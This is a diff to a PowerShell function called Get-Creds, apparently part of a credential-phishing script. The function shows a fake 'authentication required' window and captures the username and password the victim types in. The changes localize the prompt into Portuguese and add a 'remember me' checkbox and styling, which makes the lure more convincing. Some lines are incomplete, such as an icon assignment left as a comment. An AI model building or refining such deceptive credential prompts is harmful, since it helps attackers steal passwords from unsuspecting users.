@@ -44,7 +44,7 @@ function Get-Creds {
         Add-Type -AssemblyName PresentationCore,PresentationFramework 
 
         $window = New-Object System.Windows.Window
-        $window.Title = "Authentication Required"
+        $window.Title = "Autenticação necessária"
         $window.SizeToContent = 'WidthAndHeight'  
         $window.Icon = # Add a path to an icon file if you'd like
 
@@ -55,14 +55,15 @@ function Get-Creds {
         # Labels and Textboxes
         $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
         $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
+        $grid.RowDefinitions.Add((New-Object System.Windows.RowDefinition))
         $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
         $grid.ColumnDefinitions.Add((New-Object System.Windows.ColumnDefinition))
 
         $usernameLabel = New-Object System.Windows.Controls.Label
-        $usernameLabel.Content = "Username:" 
+        $usernameLabel.Content = "Nome de usuário:" 
         $usernameTextbox = New-Object System.Windows.Controls.TextBox
         $passwordLabel = New-Object System.Windows.Controls.Label
-        $passwordLabel.Content = "Password:" 
+        $passwordLabel.Content = "Senha:" 
         $passwordTextbox = New-Object System.Windows.Controls.PasswordBox
 
         Grid.SetRow($usernameLabel, 0)
@@ -81,7 +82,7 @@ function Get-Creds {
 
         # Submit Button 
         $submitButton = New-Object System.Windows.Controls.Button
-        $submitButton.Content = "Submit"
+        $submitButton.Content = "Entrar"
         $submitButton.Add_Click({
             # Capture username and password here
             $username = $usernameTextbox.Text
@@ -96,6 +97,21 @@ function Get-Creds {
         Grid.SetRow($submitButton, 2)
         Grid.SetColumnSpan($submitButton, 2) 
         $grid.Children.Add($submitButton) | Out-Null 
+
+        # Remember Me Checkbox
+        $rememberMeCheckbox = New-Object System.Windows.Controls.CheckBox
+        $rememberMeCheckbox.Content = "Lembrar-me"
+        Grid.SetRow($rememberMeCheckbox, 2)
+        Grid.SetColumn($rememberMeCheckbox, 1)
+        $grid.Children.Add($rememberMeCheckbox) | Out-Null
+
+        # Window Styling
+        $window.Background = '#fff'
+        $usernameLabel.Foreground = '#333'
+        $usernameTextbox.Background = '#ddd'
+        $passwordLabel.FontSize = 16
+        $submitButton.Width = 100
+        $submitButton.Margin = 5
 
         $window.ShowDialog()  
 
